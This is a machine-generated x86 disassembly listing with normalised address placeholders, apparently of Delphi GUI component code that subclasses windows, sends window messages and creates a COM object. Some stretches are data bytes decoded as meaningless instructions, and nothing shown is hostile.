mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_419e2c
call sub_45c380
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_419e2c
call sub_45c380
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4498e4
rcr [ eax + 0x44 ] 0x0
add [ ecx + 0x27883 ] cl
js r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
add [ ebx - 0x5efe4d35 ] cl
ror [ ecx ] 0x1
inc esp
add al ch
pop ebx
or eax [ eax ]
add [ ebx - 0x743c7430 ] cl
or bh bh
xchg ecx eax
or al 0x1
add [ eax ] al
cmp [ eax + 0x2 ] 0x0
outsb
jne r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449c40
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
jne r-xdata
add al [ eax ]
add [ ecx + 0x408b1058 ] cl
adc al 0x89
or [ edx + eax + 0x1b20000 ] 0xffffffa1
pushad
daa
inc esi
add al ch
add [ eax - 0xf740005 ] ebx
je r-xdata
call sub_4031bc
mov esi eax
add [ ecx + r-xdata ] esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 ] ch
inc esp
add [ eax ] bl
add [ eax ] al
add [ edx + edx + 0x40 ] al
add [ esp + esi ] dh
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x23ffbfcf ] ah
xor [ eax ] eax
adc eax 0x6d6f4354
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x5c ] al
cwde
inc esp
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x99
inc esp
add al al
cwde
inc esp
add [ eax ] al
add [ eax ] al
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_440e00
mov ecx esi
xor edx edx
mov eax ebx
call sub_44dbe4
push ebx
push sub_449de4
call sub_46caf0
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a4ec
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
add esp 0xfffffff0
call sub_403550
sub_449a6b
add [ ebx + 0x56 ] dl
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4031ec
lea eax [ esi + 0x27c ]
call sub_40d538
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax [ esi + 0x278 ]
call sub_46cb04
lea eax [ esi + 0x284 ]
call sub_40d538
lea eax [ esi + 0x268 ]
call sub_4058a0
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44dcd8
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_449ae4
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x292 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
sub_449b34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_440dd4
mov edx ebx
mov eax esi
call sub_4591d4
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_459100
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x289 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_449bac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_4639e8
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_4213bc
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_456c00
mov eax ebx
call sub_4598e8
mov eax [ ebx + 0x280 ]
call sub_462d14
push eax
push 0x0
push 0x402
mov eax ebx
call sub_45c380
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_449c40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_462d14
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_456c00
sub_449c6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_44e314
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424fa8
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_449cb4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454f1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_449bac
sub_449ce4
push ebx
mov ebx eax
mov eax ebx
call sub_457624
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_449d0c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_45b87c
mov eax ebx
call sub_45c684
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x270 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_449d6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4570d0
mov eax ebx
call sub_455c74
test al al
je r-xdata
cmp [ ebx + 0x289 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46cc58
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_4560f4
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_455c84
sub_449e04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a117
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44e67c
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x274 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x289 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x289 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x1
xor eax eax
push ebp
push sub_44a01b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x284 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x28a ]
mov eax [ ebp - 0x4 ]
call sub_44a150
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_4058a0
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_4058a0
push eax
push sub_44a124
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_462d14
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x284
call sub_40d538
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_455b40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a11e
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a9f0
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058b8
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44a2e4
sub edx 0xffffffec
sub_44a150
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
mov al [ esp ]
mov [ ebx + 0x28a ] al
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x28a ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_44a1b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_45ce0c
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_449bac
cmp [ edi + 0x280 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_44a214
push ebx
mov ebx eax
mov eax ebx
call sub_44e864
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_4598e8
sub_44a258
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_419b1c
test eax eax
jle r-xdata
mov eax ebx
call sub_4596e4
pop esi
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419914
mov esi eax
mov [ ebx + 0x284 ] esi
mov edx [ ebx + 0x28c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44a2a8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x270 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_44a2e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44a3e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45c684
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a3e8
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
cmp [ ebx + 0x268 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a0
mov ecx eax
mov edx sub_44a3ec
mov eax [ ebx + 0x268 ]
call sub_40d548
test al al
je r-xdata
test [ ebx + 0x26c ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov al [ r-xdata ]
cmp al [ ebx + 0x26c ]
jne r-xdata
xor eax eax
test [ ebx + 0x26c ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x26c ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x26c ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x26c ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x26c ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x26c ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x26c ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_44a3ec
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
retn
dec esp
add [ eax ] al
add [ eax ] al
mov ecx [ eax + 0x220 ]
mov [ edx ] ecx
mov ecx [ eax + 0x224 ]
mov [ edx + 0x4 ] ecx
retn
sub_44a430
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_449644
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_4197bc
pop esi
pop ebx
retn
sub_44a454
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_449644
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4197bc
pop edi
pop esi
pop ebx
retn
sub_44a484
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_44a4e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_419a78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_45c684
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a4e9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_4598e8
sub_44a4ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_43b224
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44a548
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d538
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419eac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_44a584
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a6c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_404014
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a6c8
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44a6d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403fd0
pop edi
pop esi
pop ebx
retn
sub_44a724
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_419b1c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_43b1ec
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_40804c
test eax eax
jne r-xdata
sub_44a78c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_44a7ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_44a7d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_45c684
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_45c380
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_455f88
sub_44a824
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_44a88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_443b74
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_4437cc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_443614
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4436c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a893
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44a89c
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_443b74
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_4437cc
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_443614
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4436c4
pop esi
pop ebx
retn
sub_44a8d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov edx edi
mov eax esi
call sub_447168
sub_44a908
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_44a968
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40339c
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x28c ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_449650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a96f
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44a978
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x28c ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_449650
pop esi
pop ebx
retn
sub_44a9ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a9f0
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_4058b8
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_44a9f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44aa38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_43b1ec
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403fd0
pop edi
pop esi
pop ebx
retn
sub_44aa5c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44ab22
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_44aa2c
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_44aa38
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4047a8
mov eax [ ebp - 0x4 ]
call sub_4047c8
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
